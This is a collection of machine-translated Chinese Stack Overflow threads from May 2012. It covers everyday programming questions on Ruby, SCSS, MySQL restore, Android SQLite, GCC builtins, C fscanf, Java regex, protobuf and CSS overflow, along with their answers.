> 时间：2012-05-20T19:17:57.777
> 
> 标签：ruby

以下 Ruby 代码会导致编写额外的行，我正在尝试找出导致该行的原因。

我的红宝石代码：

```
File.delete(RAILS_ROOT + '/app/views/filer/' + @navn + ".html.erb")
filen = File.open(RAILS_ROOT + '/app/views/filer/' + @app.slug + ".html.erb", "a+")
filen.write("#{params[:app][:cod]}") 
```

我检查了参数：

```
Content-Disposition: form-data; name="app[cod]" <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "DTD/xhtml1-strict.dtd"> <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="da"> <head> <title>Ruby on Rails: Welcome aboard</title> <%= javascript_include_tag 'jquery' %> 
```

但是在创建文件时会添加新行：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="da">

<head> <title>Ruby on Rails: Welcome aboard</title>

<%= javascript_include_tag 'jquery' %> 
```

什么时候应该：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="da">
<head> <title>Ruby on Rails: Welcome aboard</title>
<%= javascript_include_tag 'jquery' %> 
```

这是对 rails 检查的检查：

```
"cod"=>"<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"da\">\r\n<head> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:02:12.107

我使用 gsub 方法去掉了新行：

```
filen.puts("#{params[:app][:cod].gsub("\n", "")}") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:02:22.940

在 Posix 样式的块写入中处理嵌入式行终止符似乎只是自找麻烦。为什么不做一些始终可以使用的便携的东西，比如......

```
puts "how\r\nnow\r\nbrown\r\ncow".split 
```

虽然进入字符串“修复”它们也可以，但为什么不让内置代码为你做呢？

当然，在这种情况下，*不太*可能有人会推出新的操作系统和新的线路终止方案。*（无论如何，那*会有多邪恶？）

但是，作为一般规则和实践：让本地图书馆处理任何与系统相关的事情。编写代码以在任何地方运行。

# c++ - MoSync 与外部库的链接

> ID：10676424
> 
> 赞同：0
> 
> 时间：2012-05-20T19:18:16.000
> 
> 标签：c++, ios

我刚刚发现了[MoSync SDK](http://www.mosync.com/)，我认为它是 C++ 程序员使用相同源代码生成 iOS 和 Android 应用程序的一个非常好的选择。MAUI API 对于 C++ 程序员来说非常容易学习。我在 iPhone 模拟器上测试了一个提供的示例，它运行良好。但是当查看 xcodeproject 文件时，发现了一个看起来像汇编代码的 C++ 源文件。我搜索了有关编译过程的信息，似乎原始 c++ 代码被翻译为 IL 语言，而 IL 语言被转换为 C++ 代码。

有没有人对此过程的性能问题有任何想法。生成的代码是否有效？

我想用一些 UI 来制作一个简单的 iOS 苹果，这些 UI 在静态库中调用我的 C++ 代码。所以我制作了一个静态库（libmylib.a），它导出一个函数：

```
extern "C" double tst_function(double x)
{
    return sin(x)+2.5;
} 
```

然后我`tst_function`从 MoSync HelloNativeUI 示例中调用并将 libmylib.a 添加到 MoSync IDE 中的链接器标志。但是我在编译过程中遇到了错误：

```
>>pipe-tool libmylib.a -appcode=KOOU -stabs=stabs.tab .....

failed to load '-appcode=KOOU' 
```

我还尝试在 mastdD.lib、MAUtilD.lib、NativeUI.lib 之后将 libmylib.a 添加到其他库，但我收到以下错误消息：

那么如何告诉 MoSync IDE 调用位于静态库中的外部函数呢？

```
pipe-tool Copyright 2007-2009 Mobile Sorcery AB
pass 1\. 97 known symbols.
/Users/mosyncbuilder/slave/buildScripts/temp_j4DF/source/libs/NativeUI/ActivityIndicator.cpp:58: Error: Illegal instruction '!<arch>', 
```

那么如何告诉 IDE MoSync 从外部静态库调用函数呢？

亲切的问候，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T09:56:54.837

Pipe-tool 将仅接受 MoSync IL，但您尝试为其提供 ARM 代码。那是行不通的。

但是，可能有一种解决方法。您可以创建一个存根库，用您的程序编译它，然后从生成的 c++ 代码中删除它并用正确的版本替换它。

# sass - 在 SCSS 中动态调用变量

> ID：10676425
> 
> 赞同：5
> 
> 时间：2012-05-20T19:18:18.543
> 
> 标签：sass

我的网站有一系列编号的颜色变量：

```
$red-1: #821B0D;
$red-2: #B13631;
$red-3: #D75B5B;
$red-4: #F18788;
$red-5: #FDB9B0; 
```

我想设置一个动态调用它们的mixin，如下所示：

```
@mixin link($color-name) {
    color: $#{$color-name}-2;
    &:hover {
        color: white;
        background-color: $#{$color-name}-4;
    }
} 
```

但是，我不知道如何以这样的方式调用变量。（上面的语法不起作用。）

（为了避免明显的建议：我没有使用 SASS 的颜色函数，因为我的颜色不是由线性饱和度或亮度变化设置的。我无法在 SASS 中以编程方式生成它们。步骤之间的红色亮度变化不是与蓝色之间的相同，与绿色之间的不同，等等）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-21T01:21:13.897

首先，您建议的语法不起作用的原因是，当属性值中包含插值时，它周围的文本（例如“$”符号）被解释为纯 CSS。[这在关于插值](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#interpolation_)的 SASS 参考中有所说明。

我建议改用 SASS[列表](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#lists)。像这样的东西会给你你所追求的功能：

```
@mixin link($color) {
    color: nth($color, 2);
    &:hover {
        color: white;
        background-color: nth($color, 4);
    }
}

$red: (#821B0D, #B13631, #D75B5B, #F18788, #FDB9B0);

.test {
    @include link($red);
} 
```

（请注意，传递给[nth() 函数](http://sass-lang.com/docs/yardoc/Sass/Script/Functions.html#nth-instance_method)的索引值是从一开始的，而不是从零开始的。）

# mysql - 如何在 mysql 命令行中执行远程 .sql

> ID：10676432
> 
> 赞同：5
> 
> 时间：2012-05-20T19:19:30.047
> 
> 标签：mysql

我有一个文件位于`E:\Backup\sql\mybackup.sql`

我正在登录命令行，并在命令提示符下`mysql>`

我将如何恢复数据库 mydatabase？

我以为是

```
mydatabase > "E:\Backup\sql\mybackup.sql" 
```

但它一直在说

> 在每个未知的命令`\`

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-20T19:35:57.793

像这样运行它：

```
mysql -h localhost -u root -p mydatabase < "E:/Backup/sql/mybackup.sql" 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-20T19:25:29.357

除了转义问题之外，您的重定向运算符也有错误的方式。假设您使用的是支持 STDIN 重定向的 shell，您可以尝试：

```
mysql mydatabase < E:\\Backup\\sql\\mybackup.sql 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T19:21:07.717

`\`是分隔符。放`\\`让你逃脱了`\`。

> 对于 Windows 用户，使用正斜杠作为路径分隔符。您也不需要将文件的路径括在引号中。例如，以下作品：
> 
> mysql> source C:/Documents and Settings/My name here/My Documents/spike_loadingMySQLDB/createTables.sql;

[如https://dev.mysql.com/doc/refman/5.7/en/mysql-batch-commands.html](https://dev.mysql.com/doc/refman/5.7/en/mysql-batch-commands.html)中的评论所述

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-20T19:25:22.820

命令是

```
source "E:/Backup/sql/mybackup.sql" 
```

首先，指定数据库 ( `use dbname`) - 如果未在备份文件中指定

# jquery-ui - Tapestry5-JQuery 对话框按钮事件未触发

> ID：10676433
> 
> 赞同：0
> 
> 时间：2012-05-20T19:19:48.097
> 
> 标签：jquery-ui, tapestry

我已经制作了一个使用 Tapestry5-JQuery 并启用了 JQuery UI 的应用程序。我创建了一个页面，其中定义了一个 jquery 对话框，如下所示：

```
<t:form>
    <t:jquery.dialoglink t:dialog="dlgUrl">Show Dialog</t:jquery.dialoglink>

    <t:jquery.dialog t:clientId="dlgUrl" params="dlgUrlParams">
    <table class="dlgContent">
        <tr>
            <td><t:label for="urlName" class="dlgLabel" /></td>
            <td><t:textfield t:id="urlName" value="name" class="dlgComponent" label="Name:" />
            </td>
        </tr>
        <tr>
            <td><t:label for="url" class="dlgLabel" /></td>
            <td><t:textfield t:id="url" value="url" class="dlgComponent" label="Url:" />
            </td>
        </tr>
    </table>
    <div class="dlgBtnAlign">
        <t:submit class="ui-button ui-widget" value="Ok" t:id="dlgUrlOk"/>
    </div>
    </t:jquery.dialog>
</t:form> 
```

页面关联的java类是这样的：

```
public class DialogTestPage {
public JSONObject getDlgUrlParams() {
    JSONObject jsonObject = new JSONObject();
    jsonObject.put("title", "URL");
    jsonObject.put("modal", "true");
    jsonObject.put("dialogClass", "dlgFileAdjust");
    return jsonObject;
}

@OnEvent(value = EventConstants.SELECTED, component = "dlgUrlOk")
void onClickDlgUrlOk() {
    //Run code after clicking ok
}

void onSuccess(){
    //Run code after form submit
}} 
```

当我运行应用程序时，按钮“确定”不会触发 SELECTED 事件，也不会触发 onSuccess 处理程序。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-23T14:23:42.480

DialogLink 不会触发任何事件，DialogAjaxLink 会触发（EventConstants.ACTION）！DialogAjaxLink 还允许您更新区域。

```
<t:jquery.dialogajaxlink t:dialog="dlgUrl" t:zone="myZone">show dialog</t:jquery.dialogajaxlink> 
```

[http://tapestry5-jquery.com/components/docsjquerydialog](http://tapestry5-jquery.com/components/docsjquerydialog)

如果您希望触发成功事件，则需要提交表单。通过使用提交按钮或者如果您更喜欢链接，您可以使用 LinkSubmit 组件： [http ://tapestry5-jquery.com/core/docslinksubmit](http://tapestry5-jquery.com/core/docslinksubmit)

# android - SQLiteQueryBuilder 多选

> ID：10676440
> 
> 赞同：0
> 
> 时间：2012-05-20T19:20:40.647
> 
> 标签：android

如何向 SQLliteQueryBuilder 查询添加多个选择（where 子句）？例如，（年龄在 10 到 20 岁之间且身高 = 60）或（性别 = 'F'）

```
public Cursor query (SQLiteDatabase db, String[] projectionIn, String selection, String[] selectionArgs, String groupBy, String having, String sortOrder)

selection   A filter declaring which rows to return, formatted as an SQL WHERE clause (excluding the WHERE itself). Passing null will return all rows for the given URL.
selectionArgs   You may include ?s in selection, which will be replaced by the values from selectionArgs, in order that they appear in the selection. The values will be bound as Strings. 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-20T19:38:22.013

基本上你在`selection`字符串中传递条件，你提到像

```
String selection = "arg1 = ? and arg2 = ?" ... 
```

和`selectionArgs`is String 数组，所以这里给出了选择值：

```
selectionArgs[0] = "value of arg1";
selectionArgs[1] = "value of arg2";

and so on 
```

所以你可以使用：

```
String selection = "Age between ? and ? and Height = ?";
selectionArgs[0] = "10";
selectionArgs[1] = "20";
selectionArgs[2] = "168"; 
```

然后将这些字符串传递给`query`.

希望这可以帮助！

# python - perl 的 hash 和 python 的字典的区别

> ID：10676441
> 
> 赞同：10
> 
> 时间：2012-05-20T19:20:48.013
> 
> 标签：python, perl

我是 perl 的新手，在大多数使用 hash 的地方都会给出对 python 字典的引用。我注意到的一个区别是哈希不保留元素的顺序。我想知道两者之间是否存在一些更具体和根本的区别。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-20T19:30:48.037

最根本的区别是，如果您访问不存在的元素，perl 哈希不会引发错误。

```
$ python -c 'd = {}; print("Truthy" if d["a"] else "Falsy")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
KeyError: 'a'
$ perl -we 'use strict; my $d = {}; print $d->{"a"} ? "Truthy\n": "Falsy\n"'
Falsy
$ 
```

Perl 哈希自动创建元素太不像 python

```
$ python -c 'd = dict(); d["a"]["b"]["c"]=1'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
KeyError: 'a'
$ perl -we 'use strict; my $d = {};  $d->{a}{b}{c}=1'
$ 
```

如果您正在转换`perl`为`python`那些，那么主要的事情会吸引您。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-05-21T01:12:36.070

另一个主要区别是，在 Python 中，您可以将（用户定义的）对象作为字典键。字典将使用对象`__hash__`和`__eq__`方法来管理它。

在 Perl 中，默认情况下您不能将对象用作哈希键。键存储为字符串，如果您尝试将它们用作键，对象将被插入到字符串中。（但是，可以通过将绑定哈希与诸如[Tie::RefHash 之](http://perldoc.perl.org/Tie/RefHash.html)类的模块一起使用来将对象用作键。）

# optimization - 为什么 GCC 在严格模式下不使用内置函数？

> ID：10676445
> 
> 赞同：3
> 
> 时间：2012-05-20T19:22:13.097
> 
> 标签：optimization, gcc

在严格模式下运行时，GCC[会禁用许多内置函数](http://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html)`-std=c...`。

> 在严格的 ISO C 模式（-ansi、-std=c90、-std=c99 或 -std=c11）之外，函数 _exit、alloca、bcmp、bzero ... stpcpy，... 可以作为内置函数处理. 所有这些函数都有相应的版本前缀*_builtin*，即使在严格的 C90 模式下也可以使用。

有什么理由吗？内置函数不符合吗？或者这是因为标准说当你调用`memcpy`它时应该实际调用它并且我无法优化？

我觉得如果我使用重新编译它，我的代码肯定会运行得更快，`-std=gnu*`因为它会启用更多[优化](http://gcc.gnu.org/onlinedocs/gcc/C-Dialect-Options.html#C-Dialect-Options)

> GCC 通常会生成特殊代码来更有效地处理某些内置函数；例如，对 alloca 的调用可能成为直接调整堆栈的单个指令，对 memcpy 的调用可能成为内联复制循环

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:55:09.307

`_exit`, `alloca`, `bcmp`, `bzero`,或该列表中的任何其他函数均未`stpcpy`在 C 标准中定义，因此它们不应由符合标准的 C 编译器定义；这些名称必须可供用户用作他们自己的标识符。

请注意，在严格 ISO 模式下仍启用许多其他内置功能。例如， “除非指定，否则被`memcpy`识别为 [a] 内置 [function] ”`-fno-builtin`

# c - 我是否正确加载了我的字符数组？

> ID：10676449
> 
> 赞同：2
> 
> 时间：2012-05-20T19:22:53.353
> 
> 标签：c, arrays, pointers, malloc, valgrind

我已经盯着它看了这么久，以至于它开始一起运行。
所以我收到了一个 valgrind 错误：

```
==25468== Invalid write of size 4
==25468==    at 0x52CF64D: _IO_vfscanf (vfscanf.c:1857)
==25468==    by 0x52D730A: __isoc99_fscanf (isoc99_fscanf.c:35)
==25468==    by 0x402DDB: loadMindRAW (gplib.c:172)
==25468==    by 0x4047EE: loadAgent (gplib.c:739)
==25468==    by 0x4048BD: loadAgentsFromFile (gplib.c:799)
==25468==    by 0x4010C3: initRound (gpfight.c:220)
==25468==    by 0x400EBE: main (gpfight.c:99)
==25468==  Address 0x584388d is 253 bytes inside a block of size 256 alloc'd
==25468==    at 0x4C2B6CD: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so) 
```

这是罪犯：

```
void loadMindRAW(FILE* f_file, unsigned char* mind)
{
    int i;
    for(i=0; i < MIND_SIZE; i++)
    {
        fscanf(f_file,"%d,",&(mind[i]));
    }
} 
```

传入的无符号字符数组刚刚分配：（MIND_SIZE 为 256）

```
tmpAgent->mind = malloc(MIND_SIZE*sizeof(unsigned char));
loadMindRAW(f_file, tmpAgent->mind); 
```

我是否正确地指向了我的思想地址？`&(mind[i])`似乎有点笨拙。原始指针操作`mind+i`具有相同的行为。我在这里错过了一些简单的东西吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:27:22.057

您正确地指向了地址，但是您可能没有将指针传递`unsigned char`到`fscanf`期望`int`指针的位置。这是因为`fscanf`sees`%d`说明符，它假定可变参数列表中的相应位置是指向 signed 的指针`int`；由于可变参数在 C 和 C++ 中实现的方式，`fscanf`没有其他方法可以解决它。

以下是你应该如何重写你的循环：

```
for(i=0; i < MIND_SIZE; i++)
{
    int tmp;
    fscanf(f_file,"%d,",&tmp);
    mind[i] = (unsigned char)tmp;
} 
```

# google-chrome - Chrome API - chrome.webstore API 有什么作用？

> ID：10676450
> 
> 赞同：0
> 
> 时间：2012-05-20T19:22:53.830
> 
> 标签：google-chrome, google-chrome-extension, chrome-web-store

我注意到最近 Chrome 文档中有一个名为[chrome.webstore](http://code.google.com/chrome/extensions/webstore.html)的新 API 。文档很少，我不完全确定它应该做什么。

我希望它能让我做的是对另一个 chrome webstore 应用程序进行内联安装，有点像[这里](https://developers.google.com/chrome/web-store/docs/inline_installation)描述的。因此，如果我希望我的应用程序具有可选权限无法实现的补充部分（例如替换新标签页），我可以让他们轻松安装另一个扩展。

不幸的是，我无法真正对此进行测试，因为我在网上商店中还没有扩展，而且我认为我不能使用随机扩展，因为它验证了后端的链接。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T22:23:24.303

此 API 允许您在不直接通过 Webstore 的另一个页面中安装扩展。

更多信息在这里：[https ://developers.google.com/chrome/web-store/docs/inline_installation](https://developers.google.com/chrome/web-store/docs/inline_installation)

# java - Android：如何创建这种动态布局？

> ID：10676453
> 
> 赞同：0
> 
> 时间：2012-05-20T19:23:15.277
> 
> 标签：java, android, android-layout, user-interface

我的目标是在列表中显示人员/地址 - 但不仅仅是一个简单的列表，而是一个包含多个信息的框列表，在我的例子中是一个数字、地址和类型：

![在此处输入图像描述](../Images/00849514b8761ad1a7f74fe72aaa7095.png)

用于此的数据结构是 POJO：

*   **MyPojo.java (类)**
*   + 获取数字（）
*   + 获取类型（）
*   + 获取名称（）
*   + 获取街道（）
*   + 获取城市（）

当然，有超过 4 个条目，这意味着应该有一个滚动条。我的第一个想法： a`Scrollview`包含 a `Linear Layout`。但我不确定内容，即您可以在上面看到的框。

1.  如何定义表示列表项的此类框？正如您在上面看到的，一个框由三个部分组成，它们彼此分开（编号、类型、地址）。
2.  当然，必须可以在运行时向线性布局动态添加和删除框（意味着：条目）。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:42:08.443

*   创建一个`ListActivity`类
*   为您的项目创建单独的布局文件

    `<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:orientation="horizontal" > <LinearLayout android:orientation="vertical" > <TextView /> <TextView /> </LinearLayout> </TextView> </LinearLayout>`

*   然后创建一个内部类，`ListActivity`其中扩展自`ArrayAdapter`. 在该`getView()`方法中，使用`LayoutInflater`膨胀 yourItemLayout 并根据`position`值更新 TextView。
*   在`onCreate`主类中，调用`setListAdapter(new InnerClass(this,R.layout.yourItemLayout,list)`

您可以参考[customArrayAdapter](https://gist.github.com/721932)以了解自定义 ArrayAdapter 的工作原理。

尘埃落定。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T19:27:30.903

> `My first idea: a Scrollview that contains a Linear Layout.`

你熟悉一个[`listView`](http://developer.android.com/reference/android/widget/ListView.html)吗？这已经存在可以做到这一点。我相信你可以通过搜索找到几十个关于如何使用它们的教程。

# java - startsWith endsWith 匹配包含正则表达式

> ID：10676454
> 
> 赞同：2
> 
> 时间：2012-05-20T19:23:19.920
> 
> 标签：java, android, regex

我正在遍历语音数据的数组列表以破译用户是否回答“是”或“否”。简单的嘿...

这是我必须检测包含“是”和“否”的不清楚的响应的初始检查。它工作得很好，但只是看着它，我知道我应该不好意思发布它，它可以大大简化！

```
 if ((element.toString().startsWith("yes ")
    || element.toString().endsWith(" yes")
    || element.toString().contains(" yes "))
    && (element.toString().startsWith("no ")
    || element.toString().endsWith(" no")       
    || element.toString().contains(" no "))) {

    // I heard both yes and no - inform user I don't understand 
```

我希望用户能够使用他们想要的任何自然语音来接受或拒绝，因此需要考虑出现在数组数据中的以下不太可能发生的情况：

*   是 否
*   继续
*   是的，敲门
*   昨天没有
*   昨天敲门
*   贝叶斯定理

我经历了很多正则表达式帖子和教程，但无论我做什么，我都找不到比发布的代码更好的解决方案。空白 [\\s] 在那里或 '|' 不是，我解决不了...

我提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-20T19:28:06.703

如果您只想要单词“是”或“否”（即“贝叶斯定理色情”和“昨天”*不*匹配），那么您可以`\b`在正则表达式中用作边界字符：[`Pattern`JavaDoc](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/regex/Pattern.html)，[边界教程](http://docs.oracle.com/javase/tutorial/essential/regex/bounds.html)

假设您已经在输入小写，那么这应该可以工作：

```
Pattern yes = Pattern.compile(".*\\byes\\b.*");
Pattern no = Pattern.compile(".*\\bno\\b.*");
...
bool matchesYes = yes.matcher(input).matches();
bool matchesNo = no.matcher(input).matches();

if (matchesYes == matchesNo) {
    ... //Do "invalid answer" here -
    //we either matched both (true, true) or neither (false, false)
} else if (matchesYes) {
    ... //Do "Yes" here
} else { //Else matches No
    ... //Do "No" here
} 
```

测试代码：

```
private static Pattern yes = Pattern.compile(".*\\byes\\b.*");
private static Pattern no = Pattern.compile(".*\\bno\\b.*");
/**
 * @param args
 */
public static void main(String[] args) {
    TestMethod("yes"); //Yes
    TestMethod("no"); //No
    TestMethod("yesterday"); //Bad
    TestMethod("fred-no-bob"); //No
    TestMethod("fred'no'bob"); //No
    TestMethod("fred no bob"); //No
    TestMethod("snow"); //Bad
    TestMethod("I said yes"); //Yes
    TestMethod("yes no"); //Bad
    TestMethod("no yes"); //Bad
}

private static void TestMethod(String input) {
    System.out.print("Testing '" + input + "': ");
    bool matchesYes = yes.matcher(input).matches();
    bool matchesNo = no.matcher(input).matches();

    if (matchesYes == matchesNo) {
        System.out.println("Bad");
    } else if (matchesYes) {
        System.out.println("Yes");
    } else {
        System.out.println("No");
    }
} 
```

# java - Java Youtube api 率评论

> ID：10676455
> 
> 赞同：0
> 
> 时间：2012-05-20T19:23:25.043
> 
> 标签：java, api, youtube, comments, rate

如何评价评论条目？我知道有一个方法 setTotalRating() 但是调用这个方法后，我该怎么办？service.insert(sth) ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:59:43.343

更新评论怎么样？

```
YouTubeService service = new YouTubeService(clientID, developer_key);
//Done with authentication...blah...blah...blah...

//Done with rating...

//Update
service.update(new URL(commentURL), commentEntry); 
```

# ruby - 如何使用 omniauth / oauth 对每秒登录次数进行基准测试？（红宝石+rspec）

> ID：10676459
> 
> 赞同：6
> 
> 时间：2012-05-20T19:23:52.673
> 
> 标签：ruby, oauth, scalability, benchmarking, omniauth

我想用（自己的）omniauth 提供者来衡量每秒可以登录多少次。我需要找出这个omniauth / oauth请求的性能如何，以及这个身份验证是否可以扩展？

到目前为止我得到了什么：

```
 def performance_auth(user_count=10)
      bm = Benchmark.realtime do
        user_count.times do |n|
          fork do
            click_on 'Logout'
            omniauth_config_mock(:provider => "foo", :uid => n, :email => "foo#{n}@example.net")
            visit "/account/auth/foo/"
          end
        end
        Process.waitall
      end
      puts "#{user_count} users Benchmark: #{bm}"
      bm
  end 
```

默认值为 10 个通过 oauth 提供程序 foo 进行并行身份验证的用户。

结果：

```
only 2 users can authenticate parallel in 1 sec (is this possible?)

10 users: 5.090777 sec
20 users: 10.471208 sec
50 users: 111.565979 sec ~ 2min!!!! 
```

我真的不知道我在做什么以及这段代码是否正确。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T08:31:19.413

虽然我对 OAuth/Omniauth 没有太多经验，但这种操作的渲染时间约为 500 毫秒，与 Rails 的整体渲染时间（我假设）相结合，似乎并没有那么牵强。IMO，相信你的基准。

# jquery - .load 与 .on（“加载”）

> ID：10676460
> 
> 赞同：4
> 
> 时间：2012-05-20T19:24:22.930
> 
> 标签：jquery

我正在一个 div 中加载一个 php 页面，该页面需要一个发布的变量来显示正确的内容。它使用这个工作：

```
$(".mainArea").load("page.php", {'folder': 'a'}).fadeIn(); 
//passes vars, but all my jquery event handlers no longer work 
```

问题是，在我动态加载此内容后 - 我无法让我的事件处理程序工作。所以我认为解决方案是这样的：

```
$(".mainArea").on("load", "page.php", {'folder': 'a'}).fadeIn(); 
// all event handlers still work - but the variables do not get posted... 
```

关于如何将这两者结合起来或让后者实际传递变量的任何想法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-20T19:29:54.380

*   [`.load`](http://api.jquery.com/load/)从指定的 URL 从服务器加载数据并将结果内容放在指定的元素中。

*   该[`load` *事件*](http://api.jquery.com/load-event)在元素及其子元素已完全加载时发生。此事件仅适用于某些类型的元素。

基本上，它们做了两件完全不同的事情（但它们在 jQuery 中确实具有相同的函数名称，因此很容易混淆）。

至于您在加载新内容时未绑定事件处理程序的问题，您需要使用事件*委托*[`on`](http://api.jquery.com/on/)：

```
$("container_selector").on("event", "child-element-selector", function () {...}); 
```

# .net - .net winforms 设计器中尺寸错误的自定义控件

> ID：10676461
> 
> 赞同：0
> 
> 时间：2012-05-20T19:24:38.243
> 
> 标签：.net, winforms, user-controls

在我的解决方案中，我有一个正在创建自定义控件的项目。当我构建该项目时，我可以通过设计器将自定义控件插入到另一个项目中。一切正常

但是，使用其中一种控件和其中一种形式时，我遇到了麻烦。它应该是一个固定大小的控件，带有一个列表框、一个按钮、一个组框等等。但是当我将它从设计器中拖到这个特定的表单中时，列表框和按钮的大小都是错误的，比原来的要大得多。这不会发生在其他控件或其他表单中。我在所有表单的属性窗口中看到的属性（文本、字体、名称...除外）都是相同的。

对于如何查找正在发生的事情，我将不胜感激您的想法和指导。我对 VS 和 .NET 很陌生

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:51:59.197

当该控件设计在具有不同视频适配器 DPI（每英寸点数）设置的机器上时，就会发生这种情况。当您在您的设备上使用它时，控件会自动重新调整自身以适应您机器的 DPI 设置。所以它看起来和原来机器上的一样大。以英寸为单位，而不是像素。

这通常是非常需要的，您不想弄乱控件的 AutoScaleMode 属性。因为如果你这样做了，当它有不同的 DPI 设置时，它会在用户的机器上出现异常。通过编辑控件的 Designer.cs 文件来解决您的问题。在 InitializeComponent() 方法的底部查找分配 AutoScaleDimensions 属性并使其与在您的计算机上创建的控件相同的代码。然后，您可能还需要调整字体大小。

# java - Java Protobuf (ver. 2.4.1) 和 Protobuf-net (ver. r480) 继承兼容性

> ID：10676468
> 
> 赞同：1
> 
> 时间：2012-05-20T19:25:27.470
> 
> 标签：java, inheritance, compatibility, protocol-buffers, protobuf-net

是否可以使用 Java Protobuf 反序列化以下使用 Protobuf-net 序列化的 DerivedMessage？

```
namespace Test.Protobuf
{
  [ProtoBuf.ProtoContract]
  [ProtoBuf.ProtoInclude(2550, "Test.Protobuf.DerivedMessage")]
  class BaseMessage
  {
    [ProtoBuf.ProtoMember(1)]
    public string MessageId { get; set; }

    [ProtoBuf.ProtoMember(2)]
    public int CommandId { get; set; }
  }

  [ProtoBuf.ProtoContract]
  class DerivedMessage : BaseMessage
  {
    [ProtoBuf.ProtoMember(1)]
    public int ClientId { get; set; }

    [ProtoBuf.ProtoMember(2)]
    public string Message { get; set; }

    [ProtoBuf.ProtoMember(3)]
    public string Description { get; set; }
  }
} 
```

DerivedMessage 扩展 BaseMessage，阅读文档解决方案似乎在原型文件中使用嵌套消息，但它不起作用，这是我的原型文件：

```
package protobuf;

option java_package = "test.protobuf";
option java_outer_classname = "Proto";

message BaseMessage {
    optional string message_id = 1;
    optional int32 command_id = 2;
}

message DerivedMessage {
    optional int32 client_id = 1;
    optional string token = 2;
    optional string message = 3;
    optional string description = 4;
    optional BaseMessage base_message = 5;
} 
```

有解决办法吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:57:21.583

字段编号必须匹配，并且进入 BaseMessage，而不是 DerivedMessage。

在不相关的新闻中，您在 DerivedMessage 中的其他字段看起来很无聊；“token”来自数字，后面的 2 个字段是一对一的。

```
message BaseMessage {
    optional string message_id = 1;
    optional int32 command_id = 2;
    optional DerivedMessage derived_message = 2550;
}

message DerivedMessage {
    optional int32 client_id = 1;
    optional string message = 2;
    optional string description = 3;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T22:10:45.567

派生类是否可能不应该也有一个与父类具有相同 ID 的字段？在您的示例中， messageId 和 clientId 都具有相同的标识符：1。

# css - CSS：父母有溢出-y，但我绝对的孩子想要负左

> ID：10676469
> 
> 赞同：1
> 
> 时间：2012-05-20T19:25:27.587
> 
> 标签：css

如何使子“#mark”元素在具有“overflow-y:hidden”属性的div内出现“-10px”

这里的例子：http: [//jsfiddle.net/yX9j8/](http://jsfiddle.net/yX9j8/)

去掉溢出-y 可以看到左边-10px 的“标记”元素。

![在此处输入图像描述](../Images/480d0f2f63fb537678e8cd089c7d0bf2.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T20:13:17.307

您可以通过向滚动添加填充来做到这一点，而是在内容上使用背景颜色（看起来这对您很重要），然后绝对 div 可以在填充上可见，并将跟随滚动。

```
#scrollable{
    padding-left: 10px; /* padding goes here */
    /*background-color:#eee;*/
    width:400px;
    height:300px;
    overflow-y:scroll;
    margin-left:50px;
    position:relative;
}
#content{
    background-color:#eee; /* background color goes here */
    height:1900px;
    width:100%;   
}
#mark{
    position:absolute;
    width:10px;
    height:10px;
    background-color:#aaa;
    left: 0;  /* the position of the absoute element */ 
} 
```

​</p>

示例：http: [//jsfiddle.net/yX9j8/5/](http://jsfiddle.net/yX9j8/5/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:53:49.273

我的直觉告诉我要设置`overflow-x: visible`，但这并没有解决问题。我查看了[WC3 规范](http://www.w3.org/TR/css3-box/#overflow-x)，当我解释它时，这是不可能实现的`overflow`。这就是它所说的：

> 'overflow-x' 和 'overflow-y' 的计算值与它们的指定值相同，除了某些与 'visible' 的组合是不可能的：如果一个被指定为 'visible' 而另一个是 'scroll'或“自动”，然后“可见”设置为“自动”。如果 'overflow-y' 相同，'overflow' 的计算值等于 'overflow-x' 的计算值；否则它是'overflow-x'和'overflow-y'的一对计算值。

